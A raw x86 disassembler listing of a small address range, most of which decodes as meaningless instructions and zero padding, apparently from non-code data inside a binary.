  42b868:	adc    BYTE PTR [edx],0x4
  42b86b:	push   ebp
  42b86c:	inc    ebx
  42b86d:	loopne 0x42b806
  42b86f:	aaa    
  42b870:	inc    edi
  42b871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b872:	sbb    eax,0xa1087693
  42b877:	pop    es
  42b878:	ror    BYTE PTR [ebp+0x4effc8e3],1
  42b87e:	sub    bh,BYTE PTR [ebp+0x52ab9fb0]
  42b884:	pop    ds
  42b885:	mul    edx
  42b887:	or     DWORD PTR [esi+0x722f652],0xffffffe6
  42b88e:	test   BYTE PTR [eax-0x7c],dl
  42b891:	push   edi
  42b892:	and    al,0x7a
  42b894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b895:	jne    0x42b82c
  42b897:	add    BYTE PTR [eax+ecx*4-0x36b2f614],dl
  42b89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b89f:	out    0x4,eax
  42b8a1:	and    BYTE PTR [edi-0x6],al
  42b8a4:	sbb    al,0xd1
  42b8a6:	imul   esp,DWORD PTR [edx],0x3d
  42b8a9:	inc    esp
  42b8aa:	pop    ebx
  42b8ab:	(bad)  
  42b8ac:	in     al,dx
  42b8ad:	lahf   
  42b8ae:	cmp    eax,0x9
  42b8b1:	stos   DWORD PTR es:[edi],eax
  42b8b2:	jbe    0x42b8b4
  42b8b4:	push   ss
  42b8b5:	cdq    
  42b8b6:	mov    ebx,0x39dde05
  42b8bb:	scas   al,BYTE PTR es:[edi]
  42b8bc:	sbb    DWORD PTR [esi+eiz*4],ecx
  42b8bf:	iret   
  42b8c0:	jae    0x42b8c9
  42b8c2:	sahf   
  42b8c3:	sub    BYTE PTR [eax+0x7b8ec274],ch
  42b8c9:	dec    esi
  42b8ca:	sbb    DWORD PTR ds:0x987f7d89,0xffffffbe
  42b8d1:	aam    0x6f
  42b8d3:	aas    
  42b8d4:	pop    edi
  42b8d5:	(bad)  
  42b8d6:	fld    QWORD PTR [ebp-0x65]
  42b8d9:	(bad)  
  42b8da:	xchg   ebp,eax
  42b8db:	add    BYTE PTR [eax+ebx*8],ah
  42b8de:	dec    eax
  42b8df:	and    bx,WORD PTR [ebx+0x62453847]
  42b8e6:	(bad)  
  42b8e8:	mov    BYTE PTR [ecx],bh
  42b8ea:	jno    0x42b900
  42b8ec:	xchg   ecx,eax
  42b8ed:	imul   esp,DWORD PTR [edx],0xffffffb2
  42b8f0:	xlat   BYTE PTR ds:[ebx]
  42b8f1:	push   edi
  42b8f2:	dec    ebx
  42b8f3:	jo     0x42b964
  42b8f5:	push   ds
  42b8f6:	(bad)  
  42b8f7:	das    
  42b8f8:	and    DWORD PTR [ebx-0x72],edi
  42b8fb:	lock xchg edx,eax
  42b8fd:	clc    
  42b8fe:	iret   
  42b8ff:	dec    ecx
  42b900:	jp     0x42b88d
  42b902:	add    BYTE PTR es:[esp+ecx*4+0x7aada410],al
  42b90a:	pop    ecx
  42b90b:	and    DWORD PTR [eax+0x11],esp
  42b90e:	mov    al,0xb5
  42b910:	add    al,0x4b
  42b912:	pusha  
  42b913:	dec    esi
  42b914:	and    eax,0x893b9836
  42b919:	or     eax,0x82c282e6
  42b91e:	rol    ch,0x4a
  42b921:	dec    esi
  42b922:	pop    ecx
  42b923:	lods   al,BYTE PTR ds:[esi]
  42b924:	jo     0x42b8cf
  42b926:	iret   
  42b927:	nop
  42b928:	adc    ch,al
  42b92a:	mov    esi,0xbd302dd
  42b92f:	lahf   
  42b930:	sti    
  42b931:	mov    esp,0x9b23d7dc
  42b936:	call   0xec88:0x9a82d36f
  42b93d:	cmp    DWORD PTR [esi-0x3badaea6],eax
  42b943:	ds test esp,ebp
  42b946:	dec    ebx
  42b947:	mov    ds:0x2fe88cfc,al
  42b94c:	inc    ebp
  42b94d:	jle    0x42b8ef
  42b94f:	or     DWORD PTR [eax-0x5bef7d75],eax
  42b955:	mov    dh,0x8d
  42b957:	lods   al,BYTE PTR ds:[esi]
  42b958:	jl     0x42b985
  42b95a:	xchg   ecx,eax
  42b95b:	mov    bh,0x89
  42b95d:	test   al,0xbc
  42b95f:	iret   
  42b960:	ret    0x61d0
  42b963:	push   ds
  42b964:	in     eax,dx
  42b965:	jnp    0x42b998
  42b967:	(bad)  
  42b968:	xor    eax,0xa0342b09
  42b96d:	mul    edx
  42b96f:	repz add al,0x8e
  42b972:	xor    eax,0xb01b5b01
  42b977:	dec    esi
  42b978:	rcl    dh,0x8
  42b97b:	ins    BYTE PTR es:[edi],dx
  42b97c:	mov    edi,0x9f00014d
  42b981:	sub    BYTE PTR [ecx-0x2e4c6618],bh
  42b987:	mov    dh,0xdf
  42b989:	retf   
  42b98a:	mov    ch,0x79
  42b98c:	sbb    eax,0x4a042f20
  42b991:	add    BYTE PTR [edx+esi*2],bh
  42b994:	(bad)  ds:0xb9881ced
  42b99a:	adc    BYTE PTR [ebx-0x24],ah
  42b99d:	addr16 mov bh,0x13
  42b9a0:	mov    esp,0x9a13f124
  42b9a5:	add    BYTE PTR [eax+eax*2],dl
  42b9a8:	inc    edx
  42b9a9:	add    BYTE PTR [eax+0x57],ch
  42b9ac:	nop
  42b9ad:	mov    dh,0x96
  42b9af:	push   0x645e0c2c
  42b9b4:	push   cx
  42b9b6:	lock dec eax
  42b9b8:	into   
  42b9b9:	jae    0x42b994
  42b9bb:	mul    bh
  42b9bd:	(bad)  
  42b9be:	(bad)  
  42b9bf:	mov    edi,edx
  42b9c1:	retf   0x5819
  42b9c4:	add    DWORD PTR [eax],eax
  42b9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9c7:	pop    ss
  42b9c8:	das    
  42b9c9:	inc    edi
  42b9ca:	jg     0x42b987
  42b9cc:	iret   
  42b9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9ce:	or     DWORD PTR [edx-0x74],esp
  42b9d1:	leave  
  42b9d2:	imul   edx,edi,0x48
  42b9d5:	sti    
  42b9d6:	jl     0x42b987
  42b9d8:	pop    esi
  42b9d9:	xchg   ecx,eax
  42b9da:	pop    esp
  42b9db:	xchg   ecx,eax
  42b9dc:	cmp    DWORD PTR [edi],esp
  42b9de:	ds jl  0x42ba0f
  42b9e1:	sub    bh,BYTE PTR [edx-0xd]
  42b9e4:	stc    
  42b9e5:	aam    0x44
  42b9e7:	not    DWORD PTR [edx-0x7c]
  42b9ea:	jg     0x42b9a1
  42b9ec:	les    ecx,FWORD PTR [edi+0x68]
  42b9ef:	add    dh,BYTE PTR [eax+0x2265f410]
  42b9f5:	loopne 0x42ba3f
  42b9f7:	sbb    bl,BYTE PTR [ebx]
  42b9f9:	pop    ecx
  42b9fa:	push   ebx
  42b9fb:	mov    edi,0x38b6ddb2
  42ba00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba01:	push   edx
  42ba02:	pop    es
  42ba03:	and    eax,0xa4b6f60c
  42ba08:	dec    edx
  42ba09:	cmp    DWORD PTR [edx+edi*4+0x1],ebp
  42ba0d:	dec    esp
  42ba0e:	popf   
  42ba0f:	add    BYTE PTR [ebx],cl
  42ba11:	add    BYTE PTR [edi+edi*2-0x26],cl
  42ba15:	inc    esi
  42ba16:	sbb    cl,BYTE PTR [edi+0xa602f34]
  42ba1c:	jmp    0x42ba28
  42ba1e:	xchg   esp,eax
  42ba1f:	add    BYTE PTR [ebp+edi*2+0x3e479026],ah
  42ba26:	jnp    0x42b9e4
  42ba28:	pop    ss
  42ba29:	or     DWORD PTR [ebx-0x5c],0xbdd5625d
  42ba30:	repz add dh,ch
  42ba33:	xlat   BYTE PTR ds:[ebx]
  42ba34:	inc    esi
  42ba35:	cmc    
  42ba36:	ins    BYTE PTR es:[edi],dx
  42ba37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba38:	pop    es
  42ba39:	pop    esi
  42ba3a:	pop    ss
  42ba3b:	jmp    0x9c43546d
  42ba40:	add    cl,ah
  42ba42:	or     al,BYTE PTR [eax]
  42ba44:	popf   
  42ba45:	push   ds
  42ba46:	add    BYTE PTR [ebx+0x11],dh
  42ba49:	dec    eax
  42ba4a:	ins    DWORD PTR es:[edi],dx
  42ba4b:	push   ss
  42ba4c:	or     cl,BYTE PTR [ebx+0x60]
  42ba4f:	dec    edi
  42ba50:	sbb    BYTE PTR [eax+ecx*4-0x1c1f9ea8],dl
  42ba57:	inc    ecx
  42ba58:	repz mov eax,0x2a04a810
  42ba5e:	pop    ebp
  42ba5f:	hlt    
  42ba60:	sahf   
  42ba61:	and    BYTE PTR [eax-0x6c],bl
  42ba64:	mov    dl,ah
  42ba66:	pop    ecx
  42ba67:	addr16 fcmovne st,st(7)
  42ba6a:	ret    0xb251
  42ba6d:	fstp   QWORD PTR [esi-0x11bb2b18]
  42ba73:	call   0xff72:0xf084be68
  42ba7a:	mov    ch,0x92
  42ba7c:	pop    ebp
  42ba7d:	mov    eax,ds:0x7ffc06dd
  42ba82:	lock or ch,BYTE PTR cs:[edi+0x5b423096]
  42ba8a:	jae    0x42ba3b
  42ba8c:	shr    al,1
  42ba8e:	aad    0x1c
  42ba90:	aam    0x31
  42ba92:	xchg   esi,eax
  42ba93:	call   0x1ebee6c4
  42ba98:	ins    BYTE PTR es:[edi],dx
  42ba99:	sti    
  42ba9a:	lods   eax,DWORD PTR ds:[esi]
  42ba9b:	mov    ds:0x73f663b1,eax
  42baa0:	jns    0x42ba9f
  42baa2:	mov    esp,0x25cbb1ad
  42baa7:	push   edx
  42baa8:	repnz mov edx,0xd64bf48a
  42baae:	lods   al,BYTE PTR ds:[esi]
  42baaf:	fnstcw WORD PTR [edx+0x7d]
  42bab2:	push   0xffffffff
  42bab4:	dec    ebp
  42bab5:	mov    ds:0x807f8039,eax
  42baba:	jecxz  0x42bac0
  42babc:	jb     0x42ba86
  42babe:	adc    eax,0xbb6d7313
  42bac3:	out    dx,eax
  42bac4:	mov    ecx,0x3bc73508
  42bac9:	dec    esi
  42baca:	mov    ch,0x23
  42bacc:	hlt    
  42bacd:	stc    
  42bace:	inc    ebp
  42bacf:	sbb    al,0xd3
  42bad1:	add    al,0x86
  42bad3:	adc    eax,0x294f260e
  42bad8:	jb     0x42bae0
  42bada:	cmp    cl,BYTE PTR [esi+0x73adeb89]
  42bae0:	dec    edx
  42bae1:	mov    ah,0x2e
  42bae3:	popf   
  42bae4:	dec    ebx
  42bae5:	dec    ecx
  42bae6:	int3   
  42bae7:	stos   BYTE PTR es:[edi],al
  42bae8:	lock xchg esi,eax
  42baea:	and    bh,BYTE PTR [edi+0x42]
  42baed:	adc    eax,DWORD PTR [eax+0x1c414227]
  42baf3:	xchg   esp,eax
  42baf4:	sub    esp,eax
  42baf6:	jno    0x42bac7
  42baf8:	cmp    DWORD PTR [eax-0x612461c4],ebp
  42bafe:	shl    al,0x5a
  42bb01:	fdivp  st(3),st
  42bb03:	out    0xfa,eax
  42bb05:	sbb    DWORD PTR [ebp+0x35db808e],esi
  42bb0b:	jae    0x42bb77
  42bb0d:	and    esi,DWORD PTR [ebx+0x6e]
  42bb10:	jl     0x42bb3b
  42bb12:	mov    ecx,0x8b7e24b3
  42bb17:	and    al,0xcf
  42bb19:	mov    eax,ds:0x6133c009
  42bb1e:	mov    eax,ds:0xbb48f05b
  42bb23:	mov    ah,0xcd
  42bb25:	out    dx,eax
  42bb26:	jmp    0x571dcb64
  42bb2b:	test   eax,0x894b0e4b
  42bb30:	xchg   esp,eax
  42bb31:	jae    0x42bb45
  42bb33:	push   0xffffffbc
  42bb35:	(bad)  
  42bb36:	mov    dh,bl
  42bb38:	sbb    bh,BYTE PTR [ecx]
  42bb3a:	push   ecx
  42bb3b:	retf   0x1f9d
  42bb3e:	xor    bh,0x47
  42bb41:	je     0x42bb52
  42bb43:	dec    ebp
  42bb44:	add    BYTE PTR [esi+0x10],bl
  42bb47:	xchg   ebp,eax
  42bb48:	mov    ds:0x3b7472a0,al
  42bb4d:	xchg   esi,eax
  42bb4e:	cmp    ebp,DWORD PTR [esi-0x1e52d12c]
  42bb54:	popf   
  42bb55:	inc    edi
  42bb56:	or     eax,0x8a4f7372
  42bb5b:	mov    esi,0xc58a13a8
  42bb60:	jmp    0x42bb10
  42bb62:	test   esp,ebp
  42bb64:	or     cl,BYTE PTR [ebp+0x0]
  42bb67:	sbb    bl,BYTE PTR [edx]
  42bb69:	push   esi
  42bb6a:	mov    WORD PTR [esi-0x5e5e5ac4],?
  42bb70:	loope  0x42bb2f
  42bb72:	mov    ds:0xc3434009,al
  42bb77:	mov    dl,cl
  42bb79:	add    al,0xa0
  42bb7b:	mov    eax,ds:0x268c561
  42bb80:	rcl    al,1
  42bb82:	mov    al,0x62
  42bb84:	xor    al,0x1
  42bb86:	push   0xfe315868
  42bb8b:	add    bh,BYTE PTR [ecx+0x47147cb8]
  42bb91:	xchg   ebp,eax
  42bb92:	mov    bl,0x53
  42bb94:	add    BYTE PTR [eax],al
  42bb96:	add    BYTE PTR [eax],al
  42bb98:	dec    ecx
  42bb99:	inc    ebp
  42bb9a:	dec    esi
  42bb9b:	inc    esp
  42bb9c:	scas   al,BYTE PTR es:[edi]
  42bb9d:	inc    edx
  42bb9e:	pusha  
  42bb9f:	sub    BYTE PTR [eax],0x0
  42bba2:	add    BYTE PTR [eax],al
  42bba4:	xor    BYTE PTR [eax],al
  42bba6:	add    BYTE PTR [eax],al
  42bba8:	pusha  
  42bba9:	add    BYTE PTR [eax],al
  42bbab:	add    BYTE PTR [ecx],al
  42bbad:	add    BYTE PTR [eax],ah
  42bbaf:	add    BYTE PTR [eax],al
  42bbb1:	add    BYTE PTR [eax],al
  42bbb3:	add    BYTE PTR [eax+0x25],al
	...
  42bbf9:	add    BYTE PTR [eax],al
  42bbfb:	add    eax,DWORD PTR [eax]
  42bbfd:	add    BYTE PTR [eax],al
  42bbff:	pop    es
  42bc00:	add    BYTE PTR [eax],al
  42bc02:	add    BYTE PTR [esi],cl
  42bc04:	add    BYTE PTR [eax],al
  42bc06:	add    BYTE PTR [esi],dl
  42bc08:	add    BYTE PTR [eax],al
  42bc0a:	add    BYTE PTR [edx],ah
  42bc0c:	add    BYTE PTR [eax],al
  42bc0e:	add    BYTE PTR [eax],dh
  42bc10:	add    BYTE PTR [eax],al
  42bc12:	add    BYTE PTR [eax+eax*1],bh
  42bc15:	add    BYTE PTR [eax],al
  42bc17:	dec    edx
  42bc18:	add    BYTE PTR [eax],al
  42bc1a:	add    BYTE PTR [ebp+0x0],dl
  42bc1d:	add    BYTE PTR [eax],al
  42bc1f:	pop    ebp
  42bc20:	add    BYTE PTR [eax],al
  42bc22:	add    BYTE PTR [eax+eax*1+0x0],ah
  42bc26:	add    BYTE PTR [esi+0x0],ah
  42bc29:	add    BYTE PTR [eax],al
  42bc2b:	data16 add BYTE PTR [eax],al
  42bc2e:	add    BYTE PTR [eax+eax*1+0x0],ah
  42bc32:	add    BYTE PTR [edi+0x0],bl
  42bc35:	add    BYTE PTR [eax],al
  42bc37:	pop    eax
  42bc38:	add    BYTE PTR [eax],al
  42bc3a:	add    BYTE PTR [edx+0x0],dl
  42bc3d:	add    BYTE PTR [eax],al
  42bc3f:	dec    edx
  42bc40:	add    BYTE PTR [eax],al
  42bc42:	add    BYTE PTR [ebx+0x0],al
  42bc45:	add    BYTE PTR [eax],al
  42bc47:	cmp    eax,DWORD PTR [eax]
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	xor    al,0x0
  42bc4d:	add    BYTE PTR [eax],al
  42bc4f:	sub    al,0x0
  42bc51:	add    BYTE PTR [eax],al
  42bc53:	and    eax,0x1d000000
  42bc58:	add    BYTE PTR [eax],al
  42bc5a:	add    BYTE PTR [edi],dl
  42bc5c:	add    BYTE PTR [eax],al
  42bc5e:	add    BYTE PTR [ecx],dl
  42bc60:	add    BYTE PTR [eax],al
  42bc62:	add    BYTE PTR [ebx],cl
  42bc64:	add    BYTE PTR [eax],al
  42bc66:	add    BYTE PTR [edi],al
  42bc68:	add    BYTE PTR [eax],al
  42bc6a:	add    BYTE PTR [eax+eax*1],al
  42bc6d:	add    BYTE PTR [eax],al
  42bc6f:	add    al,BYTE PTR [eax]
	...
  42bcb1:	add    BYTE PTR [eax],al
  42bcb3:	add    eax,DWORD PTR [eax]
  42bcb5:	add    BYTE PTR [eax],al
  42bcb7:	or     DWORD PTR [eax],eax
  42bcb9:	add    BYTE PTR [eax],al
  42bcbb:	adc    al,0x0
  42bcbd:	add    BYTE PTR [eax],al
  42bcbf:	and    al,0x0
  42bcc1:	add    BYTE PTR [eax],al
  42bcc3:	cmp    BYTE PTR [eax],al
  42bcc5:	add    BYTE PTR [eax],al
  42bcc7:	dec    esi
  42bcc8:	add    BYTE PTR [eax],al
  42bcca:	add    BYTE PTR [esi+0x0],ah
  42bccd:	add    BYTE PTR [eax],al
  42bccf:	jp     0x42bcd1
  42bcd1:	add    BYTE PTR [eax],al
  42bcd3:	pop    DWORD PTR [eax]
  42bcd5:	add    BYTE PTR [eax],al
  42bcd7:	mov    al,ds:0xab000000
  42bcdc:	add    BYTE PTR [eax],al
  42bcde:	add    BYTE PTR [ebx-0x4a000000],dh
  42bce4:	add    BYTE PTR [eax],al
  42bce6:	add    BYTE PTR [eax+eax*1+0xb00000],dh
  42bced:	add    BYTE PTR [eax],al
  42bcef:	test   al,0x0
  42bcf1:	add    BYTE PTR [eax],al
  42bcf3:	mov    al,ds:0x94000000
  42bcf8:	add    BYTE PTR [eax],al
  42bcfa:	add    BYTE PTR [edx+0x7c000000],cl
  42bd00:	add    BYTE PTR [eax],al
  42bd02:	add    BYTE PTR [edx+0x0],dh
  42bd05:	add    BYTE PTR [eax],al
  42bd07:	push   0x5e000000
  42bd0c:	add    BYTE PTR [eax],al
  42bd0e:	add    BYTE PTR [edx+0x0],dl
  42bd11:	add    BYTE PTR [eax],al
  42bd13:	dec    ecx
  42bd14:	add    BYTE PTR [eax],al
  42bd16:	add    BYTE PTR [esi],bh
  42bd18:	add    BYTE PTR [eax],al
  42bd1a:	add    BYTE PTR ds:0x2b000000,dh
  42bd20:	add    BYTE PTR [eax],al
  42bd22:	add    BYTE PTR [ecx],ah
  42bd24:	add    BYTE PTR [eax],al
  42bd26:	add    BYTE PTR [ecx],bl
  42bd28:	add    BYTE PTR [eax],al
  42bd2a:	add    BYTE PTR [ecx],dl
  42bd2c:	add    BYTE PTR [eax],al
  42bd2e:	add    BYTE PTR [edx],cl
  42bd30:	add    BYTE PTR [eax],al
  42bd32:	add    BYTE PTR ds:0x2000000,al
	...
  42bd68:	add    BYTE PTR [eax],al
  42bd6a:	add    BYTE PTR [ecx],al
  42bd6c:	add    BYTE PTR [eax],al
  42bd6e:	add    BYTE PTR [esi],al
  42bd70:	add    BYTE PTR [eax],al
  42bd72:	add    BYTE PTR [ecx],dl
  42bd74:	add    BYTE PTR [eax],al
  42bd76:	add    BYTE PTR ds:0x41000000,ah
  42bd7c:	add    BYTE PTR [eax],al
  42bd7e:	add    BYTE PTR [ebp+0x0],bl
  42bd81:	add    BYTE PTR [eax],al
  42bd83:	js     0x42bd85
  42bd85:	add    BYTE PTR [eax],al
  42bd87:	nop
  42bd88:	or     al,BYTE PTR ds:0x2441af03
  42bd8e:	push   ss
  42bd8f:	ficomp WORD PTR [eax+0x3e]
  42bd92:	and    ah,dh
  42bd94:	jo     0x42bded
  42bd96:	xor    edi,ebx
  42bd98:	lea    esp,[edi+0x45]
  42bd9b:	std    
  42bd9c:	popf   
  42bd9d:	outs   dx,BYTE PTR ds:[esi]
  42bd9e:	dec    ebp
  42bd9f:	(bad)  
  42bda0:	mov    eax,ds:0x9fff4d70
  42bda5:	jno    0x42bdf1
  42bda7:	jmp    DWORD PTR [ebp-0x5901b48c]
  42bdad:	je     0x42bdf8
  42bdaf:	std    
  42bdb0:	mov    ds:0x99fa436e,al
  42bdb5:	arpl   WORD PTR [ebx],di
  42bdb7:	repnz or DWORD PTR [edi+0x2f],0x1b2e4edb
  42bdbf:	mov    bl,0x9
  42bdc1:	push   es
  42bdc2:	add    ecx,DWORD PTR [eax+0x7b000000]
  42bdc8:	add    BYTE PTR [eax],al
  42bdca:	add    BYTE PTR [eax+0x0],dh
  42bdcd:	add    BYTE PTR [eax],al
  42bdcf:	data16 add BYTE PTR [eax],al
  42bdd2:	add    BYTE PTR [ebp+0x0],bl
  42bdd5:	add    BYTE PTR [eax],al
  42bdd7:	push   ebx
  42bdd8:	add    BYTE PTR [eax],al
  42bdda:	add    BYTE PTR [ebx+0x0],cl
  42bddd:	add    BYTE PTR [eax],al
  42bddf:	inc    edx
  42bde0:	add    BYTE PTR [eax],al
  42bde2:	add    BYTE PTR [ecx],bh
  42bde4:	add    BYTE PTR [eax],al
  42bde6:	add    BYTE PTR [edi],ch
  42bde8:	add    BYTE PTR [eax],al
  42bdea:	add    BYTE PTR [esi],ah
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	add    BYTE PTR ds:0x12000000,bl
  42bdf4:	add    BYTE PTR [eax],al
  42bdf6:	add    BYTE PTR [ecx],cl
  42bdf8:	add    BYTE PTR [eax],al
  42bdfa:	add    BYTE PTR [eax+eax*1],al
  42bdfd:	add    BYTE PTR [eax],al
  42bdff:	add    DWORD PTR [eax],eax
	...
  42be29:	add    BYTE PTR [eax],al
  42be2b:	add    eax,DWORD PTR [eax]
  42be2d:	add    BYTE PTR [eax],al
  42be2f:	adc    al,BYTE PTR [eax]
  42be31:	add    BYTE PTR [eax],al
  42be33:	sub    eax,DWORD PTR [eax]
  42be35:	add    BYTE PTR [eax],al
  42be37:	dec    ebx
  42be38:	add    BYTE PTR [eax],al
  42be3a:	add    BYTE PTR [ebp+0x0],ch
  42be3d:	add    BYTE PTR [eax],al
  42be3f:	mov    BYTE PTR [esi+0x26],cl
  42be42:	sbb    al,0xc5
  42be44:	jo     0x42be92
  42be46:	das    
  42be47:	test   BYTE PTR [ebx+ebx*2+0x27],0xfe
  42be4c:	cmp    ch,BYTE PTR [edi+0x2f]
  42be4f:	inc    DWORD PTR [eax+0x78]
  42be52:	xor    edi,edi
  42be54:	inc    edi
  42be55:	xor    DWORD PTR [edi],0x408c5fff
  42be5b:	(bad)  
  42be5c:	jge    0x42bdf2
  42be5e:	dec    edi
  42be5f:	call   FWORD PTR [ebp-0x5900a16b]
  42be65:	sbb    BYTE PTR [eax-0x1],0xa7
  42be69:	jp     0x42bebe
  42be6b:	jmp    FWORD PTR [edi-0x4a00a97e]
  42be71:	mov    bl,BYTE PTR [edx-0x1]
  42be74:	mov    ecx,0xbeff5d91
  42be79:	xchg   esi,eax
  42be7a:	pop    edx
  42be7b:	inc    edx
  42be7d:	fwait
  42be7e:	pop    edx
  42be7f:	(bad)  
  42be80:	mov    esp,0x9afb4f8b
  42be85:	imul   edi,DWORD PTR [edx*8-0x71e5d1ba],0x0
  42be8d:	add    BYTE PTR [eax],al
  42be8f:	push   0x5f000000
  42be94:	add    BYTE PTR [eax],al
  42be96:	add    BYTE PTR [edi+0x0],dl
  42be99:	add    BYTE PTR [eax],al
  42be9b:	push   eax
  42be9c:	add    BYTE PTR [eax],al
  42be9e:	add    BYTE PTR [edx+0x0],cl
  42bea1:	add    BYTE PTR [eax],al
  42bea3:	inc    edx
  42bea4:	add    BYTE PTR [eax],al
  42bea6:	add    BYTE PTR [eax+eax*1],bh
  42bea9:	add    BYTE PTR [eax],al
  42beab:	xor    al,0x0
  42bead:	add    BYTE PTR [eax],al
  42beaf:	sub    al,0x0
  42beb1:	add    BYTE PTR [eax],al
  42beb3:	and    DWORD PTR [eax],eax
  42beb5:	add    BYTE PTR [eax],al
  42beb7:	adc    eax,0xa000000
  42bebc:	add    BYTE PTR [eax],al
  42bebe:	add    BYTE PTR [ebx],al
	...
  42bee8:	add    BYTE PTR [eax],al
  42beea:	add    BYTE PTR [edi],al
  42beec:	add    BYTE PTR [eax],al
  42beee:	add    BYTE PTR [edx],ah
  42bef0:	add    BYTE PTR [eax],al
  42bef2:	add    BYTE PTR [esi+0x0],al
  42bef5:	add    BYTE PTR [eax],al
  42bef7:	push   0x58
  42bef9:	daa    
  42befa:	sbb    eax,0x364489b9
  42beff:	repnz xchg esi,eax
  42bf01:	push   0x7960ff50
  42bf06:	inc    ecx
  42bf07:	push   DWORD PTR [edi]
  42bf09:	js     0x42bf3b
  42bf0b:	inc    DWORD PTR [esi-0x77]
  42bf0e:	call   FWORD PTR ss:[edx-0x65]
  42bf12:	inc    edx
  42bf13:	call   FWORD PTR [ecx-0x5e]
  42bf16:	inc    esp
  42bf17:	dec    DWORD PTR [eax-0x5b]
  42bf1a:	cmp    edi,edi
  42bf1c:	inc    edi
  42bf1d:	test   al,0x39
  42bf1f:	call   FWORD PTR [ebp+esi*4+0x45]
  42bf23:	dec    DWORD PTR [edi-0x5c00a75f]
  42bf29:	jp     0x42bf7d
  42bf2b:	jmp    DWORD PTR [ebp-0x5400b18a]
  42bf31:	jle    0x42bf85
  42bf33:	push   DWORD PTR [ecx-0x4400ab7b]
  42bf39:	xchg   ecx,eax
  42bf3a:	pop    ebp
  42bf3b:	inc    ebx
  42bf3d:	pushf  
  42bf3e:	popa   
  42bf3f:	dec    edx
  42bf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf42:	fs dec esi
  42bf45:	test   eax,0xa7ceff62
  42bf4a:	pop    esp
  42bf4b:	push   DWORD PTR [ecx+0x5ae0477f]
  42bf51:	cmp    eax,0x8722
  42bf56:	add    BYTE PTR [edi+0x0],dl
  42bf59:	add    BYTE PTR [eax],al
  42bf5b:	dec    edi
  42bf5c:	add    BYTE PTR [eax],al
  42bf5e:	add    BYTE PTR [ecx+0x0],cl
  42bf61:	add    BYTE PTR [eax],al
  42bf63:	inc    ebx
  42bf64:	add    BYTE PTR [eax],al
  42bf66:	add    BYTE PTR ds:0x37000000,bh
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	add    BYTE PTR [edx],dh
  42bf70:	add    BYTE PTR [eax],al
  42bf72:	add    BYTE PTR [ebx],ch
  42bf74:	add    BYTE PTR [eax],al
  42bf76:	add    BYTE PTR [eax],ah
  42bf78:	add    BYTE PTR [eax],al
  42bf7a:	add    BYTE PTR [ecx],dl
  42bf7c:	add    BYTE PTR [eax],al
  42bf7e:	add    BYTE PTR ds:0x1000000,al
	...
  42bfa4:	add    BYTE PTR [eax],al
  42bfa6:	add    BYTE PTR [ecx],al
  42bfa8:	add    BYTE PTR [eax],al
  42bfaa:	add    BYTE PTR [eax],cl
  42bfac:	add    BYTE PTR [eax],al
  42bfae:	add    BYTE PTR [ebx],ah
  42bfb0:	inc    edx
  42bfb1:	sbb    ebx,DWORD PTR [eax]
  42bfb3:	ins    DWORD PTR es:[edi],dx
  42bfb4:	xchg   DWORD PTR [ebx+0x32],eax
  42bfb7:	in     al,0x91
  42bfb9:	push   esp
  42bfba:	inc    eax
  42bfbb:	dec    BYTE PTR [edi-0x6f00bcac]
  42bfc1:	popa   
  42bfc2:	dec    esp
  42bfc3:	call   FWORD PTR [esi-0x7e]
  42bfc6:	ds (bad) 
  42bfc8:	aas    
  42bfc9:	(bad)  
  42bfca:	xor    al,0xff
  42bfcc:	pop    ebp
  42bfcd:	mov    ds:0xae70ff42,eax
  42bfd2:	dec    eax
  42bfd3:	jmp    DWORD PTR [ecx-0x50]
  42bfd6:	inc    ebp
  42bfd7:	dec    DWORD PTR [eax-0x4f]
  42bfda:	cmp    bh,bh
  42bfdc:	inc    esp
  42bfdd:	mov    dl,0x37
  42bfdf:	inc    DWORD PTR [ebp-0x4b]
  42bfe2:	call   DWORD PTR ss:[edi+esi*4+0x3c]
  42bfe7:	inc    DWORD PTR [esi-0x6800b36c]
  42bfed:	mov    BYTE PTR [edi-0x1],cl
  42bff0:	mov    ds:0xa8ff5085,al
  42bff5:	jl     0x42c044
  42bff7:	push   DWORD PTR [eax-0x4400b37f]
  42bffd:	mov    ss,WORD PTR [esi-0x1]
  42c000:	ret    
  42c001:	cdq    
  42c002:	pop    ebp
  42c003:	dec    eax
  42c005:	mov    ds:0xabceff61,al
  42c00a:	addr16 call esp
  42c00d:	mov    dl,0x66
  42c00f:	call   eax
  42c011:	test   al,0x5c
  42c013:	std    
  42c014:	mov    ds:0x21c03f70,eax
  42c019:	pop    ss
  42c01a:	or     eax,0x5a
  42c01f:	inc    edi
  42c020:	add    BYTE PTR [eax],al
  42c022:	add    BYTE PTR [ecx+0x0],al
  42c025:	add    BYTE PTR [eax],al
  42c027:	cmp    al,0x0
  42c029:	add    BYTE PTR [eax],al
  42c02b:	add    BYTE PTR ss:[eax],al
  42c02e:	add    BYTE PTR [edx],dh
  42c030:	add    BYTE PTR [eax],al
  42c032:	add    BYTE PTR ds:0x20000000,ch
  42c038:	add    BYTE PTR [eax],al
  42c03a:	add    BYTE PTR [ecx],dl
  42c03c:	add    BYTE PTR [eax],al
  42c03e:	add    BYTE PTR [esi],al
  42c040:	add    BYTE PTR [eax],al
  42c042:	add    BYTE PTR [ecx],al
	...
  42c068:	add    BYTE PTR [eax],al
  42c06a:	add    BYTE PTR ds:0x8a354591,al
  42c070:	xchg   ebp,eax
  42c071:	dec    edi
  42c072:	repz mov ss,WORD PTR ds:[ebx+0x41]
  42c077:	dec    DWORD PTR [edx-0x7a00c2b6]
  42c07d:	dec    ecx
  42c07e:	cmp    bh,bh
  42c080:	mov    fs,WORD PTR [edx+0x4a]
  42c083:	jmp    DWORD PTR [edi-0x6b]
  42c086:	inc    ebp
  42c087:	call   FWORD PTR [edx-0x57]
  42c08a:	inc    esp
  42c08b:	jmp    DWORD PTR [ebp-0x53]
  42c08e:	inc    esp
  42c08f:	call   FWORD PTR [esi-0x5a]
  42c092:	aas    
